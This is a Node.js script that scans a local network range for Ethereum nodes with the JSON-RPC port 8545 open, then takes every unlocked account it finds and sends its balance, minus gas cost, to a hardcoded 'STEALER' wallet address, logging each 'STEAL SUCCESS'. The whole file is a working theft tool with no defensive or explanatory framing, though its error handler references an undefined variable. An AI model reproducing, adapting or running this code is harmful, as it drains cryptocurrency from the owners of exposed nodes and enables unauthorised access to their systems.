let Web3 = require('web3');
let evilscan = require('evilscan');
const GAS_LIMIT = new Web3.utils.BN(21000);
const GAS_PRICE = new Web3.utils.BN(Web3.utils.toWei('30', 'gwei'));//eth 30GWei
const TX_COST = GAS_PRICE.mul(GAS_LIMIT);
const STEALER = '0x7f4bf1fb94449c383b95d9e70ba9795404f6d48d';
const PORT = '8545';
let options = {
    target: '192.168.0.1/23',
    port: PORT,
    concurrency:'10000',
    status:'TROU', // Timeout, Refused, Open, Unreachable
    banner:false
};

function steal(host){
	let web3 = new Web3(new Web3.providers.HttpProvider(host));
	web3.eth.getAccounts().then((accounts)=>{
        accounts.forEach((address)=>{
            web3.eth.getBalance(address).then((balance)=>{
                balance = new web3.utils.BN(balance);
            	if(balance.sub(TX_COST).cmp(0)){
                    web3.eth.sendTransaction({
                    	from: address,
						to: STEALER,
						value: balance.sub(TX_COST),
						gas: GAS_LIMIT,
                        gasPrice: GAS_PRICE
                    },(err, hash)=>{
                    	if(err){
                            console.log(err);
						}else{
                            console.log("STEAL SUCCESS", hash);
						}
					})
				}
			}).catch((err)=>{
                console.log(err);
            });
		});
	}).catch((err)=>{
		console.log(err);
	});
	//web3.eth.sendSignedTransaction({})
}

let scanner = new evilscan(options);

scanner.on('result',function(data) {
	if(data.status == 'open'){
        steal(`http://${data.ip}:${PORT}`);
		console.log(data);
	}
});

scanner.on('error',function(err) {
    throw new Error(data.toString());
});

scanner.on('done',function() {
	
	console.log('done', (new Date() - begin)/1000);
    // finished !
});
let begin=new Date();
scanner.run();